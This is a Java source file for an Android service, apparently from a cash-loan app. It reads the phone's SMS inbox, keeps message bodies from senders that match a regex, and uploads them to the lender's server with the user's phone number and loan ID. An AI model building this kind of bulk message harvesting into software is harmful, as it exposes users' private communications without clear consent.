package com.jiaye.cashloan.service;

import android.Manifest;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.v4.content.LocalBroadcastManager;

import com.jiaye.cashloan.LoanApplication;
import com.jiaye.cashloan.http.base.EmptyResponse;
import com.jiaye.cashloan.http.data.sms.UploadSmsRequest;
import com.jiaye.cashloan.http.utils.SatcatcheResponseTransformer;
import com.jiaye.cashloan.persistence.User;
import com.jiaye.cashloan.utils.RegexUtil;
import com.jiaye.cashloan.view.ThrowableConsumer;
import com.orhanobut.logger.Logger;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Flowable;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;
import pub.devrel.easypermissions.EasyPermissions;

public class UploadSmsService extends Service {

    public static final String START_UPLOAD_SMS_ACTION = "com.jiaye.cashloan.UPLOAD_SMS";

    private final Uri URI_SMS_INBOX = Uri.parse("content://sms/inbox");

    private Disposable mDisposable;

    public UploadSmsService() {
    }

    public static void startUploadSmsService(Context context) {
        Intent intent = new Intent(context, UploadSmsService.class);
        context.startService(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private List<UploadSmsRequest.SmsInfo> getSmsList() {
        List<UploadSmsRequest.SmsInfo> list = new ArrayList<>();
        String[] projection = new String[]{"address", "body"};
        Cursor cursor = getContentResolver().query(URI_SMS_INBOX, projection, null, null, "date desc");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex("address"));//手机号
                String body = cursor.getString(cursor.getColumnIndex("body"));//短信内容
                if (number.matches(RegexUtil.smsPhoneNum())) {
                    UploadSmsRequest.SmsInfo smsInfo = new UploadSmsRequest.SmsInfo();
                    smsInfo.setPhoneNum(number);
                    smsInfo.setMessage(body);
                    list.add(smsInfo);
                }
            }
        }
        return list;
    }

    private UploadSmsRequest getRequest() {
        UploadSmsRequest request = new UploadSmsRequest();
        User user = LoanApplication.getInstance().getDbHelper().queryUser();
        request.setPhone(user.getPhone());
        request.setLoanId(user.getLoanId());
        request.setSmsInfos(getSmsList());
        return request;
    }

    private void uploadSms() {
        mDisposable = Flowable.just(1)
                .map(integer -> getRequest())
                .compose(new SatcatcheResponseTransformer<UploadSmsRequest, EmptyResponse>("uploadSms"))
                .subscribeOn(Schedulers.io())
                .observeOn(Schedulers.io())
                .subscribe(response -> stopSelf(),
                        new ThrowableConsumer() {
                            @Override
                            public void accept(Throwable t) throws Exception {
                                Logger.d(t.getMessage());
                                stopSelf();
                            }
                        });
    }

    private BroadcastReceiver uploadSmsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (EasyPermissions.hasPermissions(UploadSmsService.this, Manifest.permission.READ_SMS)) {
                uploadSms();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        IntentFilter intentFilter = new IntentFilter(START_UPLOAD_SMS_ACTION);
        LocalBroadcastManager.getInstance(this).registerReceiver(uploadSmsReceiver, intentFilter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        LocalBroadcastManager.getInstance(this).unregisterReceiver(uploadSmsReceiver);
        mDisposable.dispose();
    }
}
